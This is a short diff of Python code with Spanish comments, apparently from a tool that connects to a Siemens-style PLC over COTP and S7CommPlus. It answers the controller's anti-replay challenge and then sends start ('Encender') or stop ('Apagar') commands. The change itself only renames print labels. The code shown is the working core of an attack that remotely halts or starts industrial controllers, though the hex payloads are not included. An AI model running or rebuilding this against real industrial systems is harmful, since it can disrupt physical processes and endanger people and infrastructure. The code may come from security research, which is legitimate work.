@@ -240,7 +240,7 @@ def fEncApPLC(pHostPLC, pAction):
 
     # 1. Enviar payload de solicitud de comunicacion COTP
     vSocketConPLC.send(bytearray.fromhex(vPayloadSolComCOTP))
-    print(f"Solicitud: {vPayloadSolComCOTP}")
+    print(f"Payload: {vPayloadSolComCOTP}")
     vResp = vSocketConPLC.recv(1024)
     if not vResp:
       print(f"No se recibió respuesta al enviar {vPayloadSolComCOTP} \n")
@@ -256,7 +256,7 @@ def fEncApPLC(pHostPLC, pAction):
 
     # 2. Enviar payload de solicitud de comunicación S7CommPlus
     vSocketConPLC.send(bytearray.fromhex(vPayloadSolComS7))
-    print(f"Solicitud: {vPayloadSolComS7}")
+    print(f"Payload: {vPayloadSolComS7}")
     vResp = vSocketConPLC.recv(1024)
     if not vResp:
       print(f"No se recibió respuesta al enviar {vPayloadSolComS7} \n")
@@ -273,7 +273,7 @@ def fEncApPLC(pHostPLC, pAction):
     # 3. Enviar payload con respuesta al challenge anti-replay
     vPayloadConAntiReplay = fInyectarAntiReplayEnPayload(bytearray.fromhex(vRespuestaHEX))
     vSocketConPLC.send(bytearray.fromhex(vPayloadConAntiReplay))
-    print(f"Solicitud: {vPayloadConAntiReplay}")
+    print(f"Payload: {vPayloadConAntiReplay}")
     vResp = vSocketConPLC.recv(1024)
     if not vResp:
       print(f"No se recibió respuesta al enviar {vPayloadConAntiReplay} \n")
@@ -291,7 +291,7 @@ def fEncApPLC(pHostPLC, pAction):
     if pAction == "Encender":
       vPayloadEncenderConAntiReplay = fInyectarAntiReplayEnPayload(bytearray.fromhex(vPayloadEncenderPLC))
       vSocketConPLC.send(bytearray.fromhex(vPayloadEncenderConAntiReplay))
-      print(f"Solicitud: {vPayloadEncenderConAntiReplay}")
+      print(f"Payload: {vPayloadEncenderConAntiReplay}")
       vResp = vSocketConPLC.recv(1024)
       if not vResp:
         print(f"No se recibió respuesta al enviar {vPayloadEncenderConAntiReplay} \n")
@@ -307,7 +307,7 @@ def fEncApPLC(pHostPLC, pAction):
     elif pAction == "Apagar":
       vPayloadApagarConAntiReplay = fInyectarAntiReplayEnPayload(bytearray.fromhex(vPayloadApagarPLC))
       vSocketConPLC.send(bytearray.fromhex(vPayloadApagarConAntiReplay))
-      print(f"Solicitud: {vPayloadApagarConAntiReplay}")
+      print(f"Payload: {vPayloadApagarConAntiReplay}")
       vResp = vSocketConPLC.recv(1024)
       if not vResp:
         print(f"No se recibió respuesta al enviar {vPayloadApagarConAntiReplay} \n")
